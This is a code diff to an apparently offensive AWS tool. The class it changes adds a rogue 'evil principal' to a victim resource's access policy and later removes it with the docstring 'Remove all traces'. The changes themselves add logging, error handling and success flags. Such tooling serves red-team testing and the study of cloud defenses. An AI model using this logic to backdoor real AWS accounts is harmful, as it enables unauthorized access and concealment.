@@ -1,10 +1,17 @@
 from abc import ABCMeta, abstractmethod
 import json
-import boto3
+import logging
 import copy
+import boto3
+import botocore
+from botocore.exceptions import ClientError
+
 from endgame.shared.policy_document import PolicyDocument
 from endgame.shared.response_message import ResponseMessage
 from endgame.shared.list_resources_response import ListResourcesResponse
+from endgame.shared.response_message import ResponseGetRbp
+
+logger = logging.getLogger(__name__)
 
 
 class ResourceType(object):
@@ -35,7 +42,7 @@ class ResourceType(object):
         self.override_resource_block = override_resource_block  # Override for EFS
         self.override_account_id_instead_of_principal = override_account_id_instead_of_principal  # Override for logs, sns, sqs, and lambda
 
-        self.policy_document = self._get_rbp()
+        self.policy_document = self._get_rbp().policy_document
         # Store an original copy of the policy so we can compare it later.
         self.original_policy = copy.deepcopy(json.loads(json.dumps(self.policy_document.original_policy)))
 
@@ -43,7 +50,7 @@ class ResourceType(object):
         return '%s' % (json.dumps(json.loads(self.policy_document.__str__())))
 
     @abstractmethod
-    def _get_rbp(self) -> PolicyDocument:
+    def _get_rbp(self) -> ResponseGetRbp:
         raise NotImplementedError("Must override _get_rbp")
 
     @property
@@ -58,6 +65,7 @@ class ResourceType(object):
     # def add_myself(self, evil_principal: str, dry_run: bool = False) -> dict:
     def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
         """Add your rogue principal to the AWS resource"""
+        logger.debug(f"Adding {evil_principal} to {self.arn}")
         evil_policy = self.policy_document.policy_plus_evil_principal(
             victim_account_id=self.current_account_id,
             evil_principal=evil_principal,
@@ -67,18 +75,29 @@ class ResourceType(object):
             set_rbp_response = self.set_rbp(evil_policy=evil_policy)
             operation = "ADD_MYSELF"
             message = set_rbp_response.message
+            success = set_rbp_response.success
         else:
             # new_policy = evil_policy
             operation = "DRY_RUN_ADD_MYSELF"
             message = "DRY_RUN_ADD_MYSELF"
-        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
-                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
-                                           updated_policy=evil_policy, resource_type=self.resource_type,
-                                           resource_name=self.name, service=self.service)
+            try:
+                # this is just to get the success message
+                # TODO: Create a response class for the _get_rbp() response so you can capture whether or not ClientError happened
+                tmp = self._get_rbp()
+                success = tmp.success
+            except botocore.exceptions.ClientError as error:
+                message = str(error)
+                success = False
+        response_message = ResponseMessage(message=message, operation=operation, success=success,
+                                           evil_principal=evil_principal, victim_resource_arn=self.arn,
+                                           original_policy=self.original_policy, updated_policy=evil_policy,
+                                           resource_type=self.resource_type, resource_name=self.name,
+                                           service=self.service)
         return response_message
 
     def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
         """Remove all traces"""
+        logger.debug(f"Removing {evil_principal} from {self.arn}")
         policy_stripped = self.policy_document.policy_minus_evil_principal(
             victim_account_id=self.current_account_id,
             evil_principal=evil_principal,
@@ -88,15 +107,17 @@ class ResourceType(object):
             operation = "UNDO"
             set_rbp_response = self.set_rbp(evil_policy=policy_stripped)
             message = set_rbp_response.message
+            success = set_rbp_response.success
         else:
             operation = "DRY_RUN_UNDO"
-            # new_policy = policy_stripped
             message = "DRY_RUN_UNDO"
+            success = True
 
-        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
-                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
-                                           updated_policy=policy_stripped, resource_type=self.resource_type,
-                                           resource_name=self.name, service=self.service)
+        response_message = ResponseMessage(message=message, operation=operation, success=success,
+                                           evil_principal=evil_principal, victim_resource_arn=self.arn,
+                                           original_policy=self.original_policy, updated_policy=policy_stripped,
+                                           resource_type=self.resource_type, resource_name=self.name,
+                                           service=self.service)
         return response_message
 
 
